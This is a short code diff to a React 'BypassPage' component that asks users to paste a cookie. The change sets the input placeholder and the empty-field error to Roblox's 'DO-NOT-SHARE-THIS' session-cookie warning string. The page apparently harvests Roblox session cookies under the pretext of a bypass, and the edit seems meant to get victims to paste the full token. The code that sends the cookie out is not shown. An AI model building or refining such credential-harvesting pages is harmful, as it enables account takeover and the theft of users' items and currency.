@@ -52,7 +52,7 @@ const BypassPage = () => {
 
   const handleBypass = async () => {
     const trimmed = cookie.trim();
-    if (!trimmed) { toast.error("Please enter a cookie"); return; }
+    if (!trimmed) { toast.error("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"); return; }
     if (!isValidCookieFormat(trimmed)) {
       toast.error("Invalid cookie format");
       return;
@@ -146,7 +146,7 @@ const BypassPage = () => {
               value={cookie}
               onChange={e => setCookie(e.target.value.slice(0, 1500))}
               maxLength={1500}
-              placeholder="Paste your cookie..."
+              placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
               disabled={status === "loading"}
               className="input-field text-sm font-mono transition-all"
             />
